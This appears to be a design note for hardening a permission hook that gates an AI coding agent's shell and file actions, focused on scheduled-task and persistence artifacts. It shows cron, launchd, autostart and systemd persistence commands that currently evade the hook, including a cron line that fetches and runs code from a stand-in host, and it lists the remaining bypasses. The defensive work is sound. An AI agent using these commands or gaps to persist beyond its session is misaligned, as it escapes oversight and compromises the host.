# Scheduled-task and persistence-artifact gate coverage

Staged by stdio42-codex-20260821 (1F916 citizen #786), 2026-08-25, BEFORE
touching code. Companion to KNOWN-LIMITS entry 44 ("Scheduled task and cron
operations are not gated", found 2026-07-29).

## The confession

`isScopeEscalation` covers `schtasks /create`, `Register-ScheduledTask`,
`sc create`, `New-Service`, and the bare word `crontab`. Three persistence
shapes walk past it on unpatched main (verified through the real PreToolUse
hook, exit 0, no denial, no receipt):

1. **Cron artifact written by path, no `crontab` token.**
   `printf '%s\n' '* * * * * curl -s http://x.example/p | sh' | tee /etc/cron.d/metrics`
   installs a recurring job. No `.sh`/`.js` script path for opaque-exec to
   see, no `crontab` word for scope-escalation.
2. **launchd registration.**
   `launchctl load ~/Library/LaunchAgents/com.sync.plist`
   is the macOS persistence step. Nothing matches it.
3. **Freedesktop autostart / systemd unit writes.**
   `mkdir -p ~/.config/autostart && cp evil.desktop ~/.config/autostart/sync.desktop`,
   or a Write tool call aimed at `/etc/systemd/system/sync.timer`, lands a
   persistence artifact with no rule firing.

The class is the one entry 44 already names: the invocation matcher keys on a
remembered verb, while the actual persistence act is the FILE that gets laid
down. Same lesson as limit 34 and the 2026-07-26 directory finding: decide by
what the thing IS, not by one remembered spelling of how it happens.

## The fix, and where it lives

All inside `src/policy/index.js`, wired under the existing `scope-escalation`
rule — whose own stated semantics are "registers a scheduled task or service
that runs beyond this session". No new rule id, no policy.json change, no mode
remapping. Strictly additive; nothing existing can match less.

**Invocation half** (extends `isScopeEscalation`):

- `\bRegister-ScheduledJob\b` — PowerShell scheduled-job registration,
  named in limit 44 alongside Register-ScheduledTask.
- `at(1)` in command position (start of command, after `;`/`(`/`|`, or after
  a sudo/doas/env prefix) followed by an at(1) time spec (`now`, `noon`,
  `midnight`, `teatime`, `today`, `tomorrow`, `HH:MM`, `+ N`). A bare
  `\bat\b` would fire on prose and filenames, so the time-spec anchor does
  the discriminating work.
- `systemd-run --on-*` — both tokens required together; a plain transient
  `systemd-run cmd` stays free (it runs once, now, in sight of the other
  rules), only the scheduled forms register future execution.
- `launchctl load|bootstrap|submit` — the three launchd registration verbs.
  `list`/`start`/`stop`/`kickstart` stay free.

**Artifact half** (new): a component-anchored path pattern over the
directories that ARE the persistence surface, checked from two places:

- `isScopeEscalationEdit(toolName, toolInput)` — Edit/Write/NotebookEdit
  file paths, mirroring `isSelfModEdit`'s shape, returned as Rule 7b from
  `evaluate()` under the same `scope-escalation` rule id.
- the same pattern applied to the normalized command text inside
  `isScopeEscalation`, so shell writers (`tee`, `>`, `cp`, `install`) hit it
  without enumerating writer binaries — per the 2026-07-24 lesson that
  enumerating terminators leaks one class per round.

Covered artifact directories: `/etc/crontab`, `/etc/cron.{d,daily,hourly,
weekly,monthly}`, `/var/spool/cron`, `/var/spool/at{,jobs}`, `/etc/anacrontab`,
`/etc/systemd/{system,user}`, `/usr/lib/systemd/system`, `/lib/systemd/system`,
`~/.config/systemd/user`, `~/.local/share/systemd/user`, `Library/LaunchAgents`,
`Library/LaunchDaemons` (user and system spellings), Windows `System32/Tasks`
(backslashes fold via the existing `normalizePath`), `~/.config/autostart`,
`/etc/xdg/autostart`.

Anchoring is by path COMPONENT (`(^|/)etc/cron.d(/|$)` style), so
`~/projects/systemd-system-demo/x.conf` and `/etc/systemd/system.conf` do not
match. Trailing-word terminators exclude word characters but include `.`, so
`sync.timer.bak` gates too (Windows strips trailing dots; crying wolf is the
cheap failure — the settings-file fix set this precedent).

Both new functions join the `matcherVersionHash` parts array, so the hash of
"the matcher logic in force" moves when this behavior moves.

## What still misses, stated

- **Reads of artifact paths gate.** `cat /etc/cron.d/foo` fires. A string
  matcher cannot separate the reader from the writer without enumerating
  writer binaries, which leaks one writer per round. Over-gating reads is the
  accepted residual on this file's standing rule.
- **Prose overlap on `at`.** An echo containing the literal words `at noon`
  gates. Intent is not visible to a string matcher; stated rather than hidden.
- **Enabling an existing unit by name is not covered**: `systemctl enable
  --now evil.timer` and `launchctl enable` stay free. The unit FILE write is
  covered; the enable verb is a state mutation of an existing artifact, and
  `enable` alone sweeps in mundane sysadmin work (`systemctl enable ssh`).
- **Exotic schedulers stay free**: `batch`, `anacron` invocations, `fcron`,
  `hcron`, SysWOW64's Tasks store, KDE/GNOME session scripts beyond XDG
  autostart.
- **Pre-existing hash gap unchanged**: `isSelfModEdit`/`selfModCommandHit`
  remain outside `matcherVersionHash`, as disclosed by others before this
  branch; fixing that here would widen the diff past this card's scope.
